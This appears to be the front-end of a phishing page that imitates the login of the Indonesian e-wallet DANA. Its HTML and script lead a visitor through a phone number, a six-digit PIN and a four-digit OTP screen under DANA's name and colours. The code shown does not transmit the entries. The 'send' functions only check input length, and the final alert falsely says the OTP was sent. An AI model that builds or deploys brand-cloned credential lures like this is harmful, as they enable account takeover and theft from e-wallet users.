<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <title>Masuk DANA</title>
    <style>
        /* Pengaturan dasar halaman */
        html, body {
            height: 100%;
            overflow: hidden; /* Menyembunyikan scrollbar */
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            background-color: #1a73e8; /* Warna biru khas DANA */
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            max-width: 400px;
            height: 100%; /* Memastikan kontainer mengisi tinggi layar */
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
            display: flex;
            flex-direction: column; /* Mengatur arah konten ke bawah */
            justify-content: center; /* Menyejajarkan konten di tengah */
        }
        .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            color: #000000; /* Warna hitam untuk kontras */
            font-weight: bold;
            margin: 15px 0;
        }
        input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 14px;
            font-size: 1.1em;
            color: #000000; /* Teks hitam dalam input */
            border: 1px solid #d4d4d4;
            border-radius: 8px;
            margin-top: 15px;
            text-align: center;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #1a73e8; /* Warna biru tombol */
            color: #ffffff;
            font-weight: bold;
            font-size: 1.1em;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1558c3; /* Warna biru gelap saat di-hover */
        }
        .pin-input-container, .otp-input-container {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .pin-input, .otp-input {
            width: 55px;
            height: 55px;
            font-size: 1.3em;
            text-align: center;
            color: #000000; /* Teks hitam dalam input PIN/OTP */
            border: 1px solid #d4d4d4;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <!-- Halaman Input Nomor Telepon -->
    <div class="container" id="phonePage">
        <img src="dana-logo.png" alt="Logo DANA" class="logo">
        <h2>Masuk atau Daftar dengan Nomor HP</h2>
        <input type="tel" id="phoneNumber" placeholder="Masukkan nomor telepon">
        <button onclick="sendPhoneNumber()">Lanjut</button>
    </div>

    <!-- Halaman Masukkan PIN -->
    <div class="container" id="pinPage" style="display: none;">
        <img src="dana-logo.png" alt="Logo DANA" class="logo">
        <h2>Masukkan PIN Anda</h2>
        <div class="pin-input-container">
            <input type="password" maxlength="1" class="pin-input" oninput="autoMove(this, 'pin')">
            <input type="password" maxlength="1" class="pin-input" oninput="autoMove(this, 'pin')">
            <input type="password" maxlength="1" class="pin-input" oninput="autoMove(this, 'pin')">
            <input type="password" maxlength="1" class="pin-input" oninput="autoMove(this, 'pin')">
            <input type="password" maxlength="1" class="pin-input" oninput="autoMove(this, 'pin')">
            <input type="password" maxlength="1" class="pin-input" oninput="autoMove(this, 'pin')">
        </div>
        <button onclick="sendPin()">Lanjut</button>
    </div>

    <!-- Halaman OTP -->
    <div class="container" id="otpPage" style="display: none;">
        <img src="dana-logo.png" alt="Logo DANA" class="logo">
        <h2>Masukkan Kode OTP</h2>
        <div class="otp-input-container">
            <input type="password" maxlength="1" class="otp-input" oninput="autoMove(this, 'otp')">
            <input type="password" maxlength="1" class="otp-input" oninput="autoMove(this, 'otp')">
            <input type="password" maxlength="1" class="otp-input" oninput="autoMove(this, 'otp')">
            <input type="password" maxlength="1" class="otp-input" oninput="autoMove(this, 'otp')">
        </div>
        <button onclick="sendOtp()">Lanjut</button>
    </div>

    <script>
        // Fungsi otomatis pindah fokus
        function autoMove(currentInput, type) {
            const inputs = document.querySelectorAll(`.${type}-input`);
            if (currentInput.value.length === 1) {
                const nextInput = currentInput.nextElementSibling;
                if (nextInput) {
                    nextInput.focus();
                }
            }
        }

        // Fungsi untuk pindah halaman
        function nextPage(pageId) {
            document.querySelectorAll('.container').forEach(page => {
                page.style.display = 'none';
            });
            document.getElementById(pageId).style.display = 'block';
        }

        // Fungsi untuk mengirim nomor telepon
        function sendPhoneNumber() {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            if (phoneNumber === "") {
                alert("Nomor telepon tidak boleh kosong.");
                return;
            }
            nextPage('pinPage');
        }

        // Fungsi untuk mengirim PIN
        function sendPin() {
            const pinInputs = document.querySelectorAll('.pin-input');
            const pin = Array.from(pinInputs).map(input => input.value).join('');
            if (pin.length < 6) {
                alert("PIN harus 6 digit.");
                return;
            }
            nextPage('otpPage');
        }

        // Fungsi untuk mengirim OTP
        function sendOtp() {
            const otpInputs = document.querySelectorAll('.otp-input');
            const otp = Array.from(otpInputs).map(input => input.value).join('');
            if (otp.length < 4) {
                alert("Kode OTP harus 4 digit.");
                return;
            }
            alert("OTP berhasil dikirim!");
        }
    </script>
</body>
</html>
